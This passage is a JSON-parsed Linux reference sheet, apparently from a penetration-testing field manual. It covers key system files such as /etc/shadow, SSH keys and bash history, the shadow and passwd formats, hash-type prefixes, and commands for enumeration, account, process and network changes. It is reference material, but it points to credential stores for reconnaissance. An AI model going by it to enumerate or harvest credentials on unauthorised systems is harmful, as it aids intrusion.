        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Variable system files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Important File/Directory Descriptions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/shadow",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User account information and password hashes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/passwd",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User account information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Group names",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/rc.d",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/rc.d"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Startup services (rc0.d-rc6.d)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/init.d",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/init.d"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Contains startup/stop scripts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/hosts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hardcoded hostname and IP combinations",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/hostname",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Full hostname with domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/network/interfaces",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/netplan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/profile",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System environment variables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/apt/sources.list",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/apt/sources.list"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Debian package source",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/resolv.conf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/resolv.conf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/home/<USER>/.bash_history",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/.bash_h"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Bash history",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/usr/share/wireshark/manuf",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Vendor-MAC lookup (Kali Linux)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "~/.ssh/",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH keystore",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/var/log",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "System log files (most Linux)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/var/adm",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "System log files (Unix)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/var/spool/cron",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List cron files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/var/log/apache2/access.log",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/var/log/apache2/access.log"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Apache connection log",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/fstab",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Contains local and network configured mounts and shares",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/shadow File Format",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "7",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "8",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "root:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$6$RqNi$...PbED0:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "16520:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "0:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "99999:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "7:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": ":",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": ":",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Login name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Encrypted password",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Date of last password change (days since epoch)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Minimum password age (in days)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Maximum password age (in days)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Password warning period (in days)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "7",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Password inactivity period (in days)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "8",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Account expiration date (days since epoch)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reserved",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/shadow Hash Types",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "kryptonite:$6$n4wLdmr59pt.......:18912:0:99999:7:::",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "First three characters of the hash list the hash type",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$1$",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MD5",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$2a$",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "bcrypt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$2y$",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "bcrypt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$5$",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SHA-256",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$6$",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SHA-512",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: */etc/login.defs contains the shadow configuration.",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/login.defs"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/passwd File Format",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "7",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "root:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "0:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "0:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Root:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/root:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/bin/bash:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Login name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Password (x: password in shadow file, *: user cannot use login)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "User ID (UID) root = 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Primary Group ID (GID)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Comment Field/User full name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User’s home directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "7",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User’s default shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux System Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Operating System Information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "df -h",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Disk usage",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "uname -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kernel version & CPU information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cat /etc/issue",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display OS information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cat /etc/*release*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display OS version information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cat /proc/version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display kernel information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "which <SHELL_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Locate the executable files or location of each shell on the system (Can search: tscsh, csh, ksh, bash, etc.)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "fdisk -l",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display connected drives",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Manipulate Packages Using RPM (Red Hat)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rpm -qa",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all installed Redhat Packages",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rpm -ivh *.rpm",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Install all Red Hat packages with a filename ending in .rpm in the current directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rpm -e <PACKAGE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remove Red Hat Package",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Manipulate Packages Using DPKG",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dpkg --get-selections",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all installed packages",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dpkg –i *.deb",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Install all packages with a filename ending in .deb in the current directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dpkg –r <PACKAGE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remove Package",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Update System Using Apt Get",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "apt-get update",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Updates repositories and available packages to prepare for OS/tool update",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "apt-get upgrade",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Installs newer versions of packages if available (checks results of apt-get update)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "apt-get dist-upgrade",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Intelligently updates system, updating dependencies and removing older obsolete packages as needed",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Situational Awareness & Process Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "id",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Displays current user/group information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "w",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List logged on users and what they are doing",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "who -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Show currently logged in users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "last -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Show past and current login and system boot information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ps -ef",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Process listing",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mount",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "findmnt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List mounted drives",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "kill -9 <PID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Force kill processes with specific PID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "killall <PROCESS_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kill all processes matching a specific name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "top",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Show all processes sorting by most active",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cat /etc/fstab",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List configured persistent mounts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Account Enumeration & Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "getent passwd",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display user and service accounts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "useradd –m <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add a user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "usermod -g <GROUPNAME> <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add user to group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "passwd <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Change user password",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "usermod --expiredate 1 --lock --shell /bin/nologin <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Lock user account",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "usermod --expiredate 99999 --unlock --shell /bin/bash <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Unlock user account",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "chage –l <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate user account details",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "userdel <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "watch --interval 3 ss -t --all",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all listening, established, and connected TCP sockets every 3 seconds",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netstat -tulpn",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all listening TCP and UDP sockets with associated PID/program name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "lsof –i –u <USERNAME> -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all network activity associated to a specific user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig <INTERFACE_NAME> <NEW_IP> netmask <NEW_SUBNET_MASK>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip addr add <NEW_IP> dev <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set IP and NETMASK",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig <INTERFACE_NAME>:<NEW_INTERFACE_NAME> <NEW_IP>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip addr add <NEW_IP>/<CIDR> dev <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add second IP to existing interface",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "route add default gw <IP_ADDRESS> <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip route add <IP_ADDRESS>/<CIDR> via <GATEWAY_IP> dev <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set gateway",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network Configuration Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig <INTERFACE_NAME> mtu <SIZE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip link set dev <INTERFACE_NAME> mtu <SIZE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Change MTU size",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig <INTERFACE_NAME> hw ether <MAC_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip link set dev <INTERFACE_NAME> down",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip link set dev <INTERFACE_NAME> address <MAC_ADDRESS>",
      "level": 0,
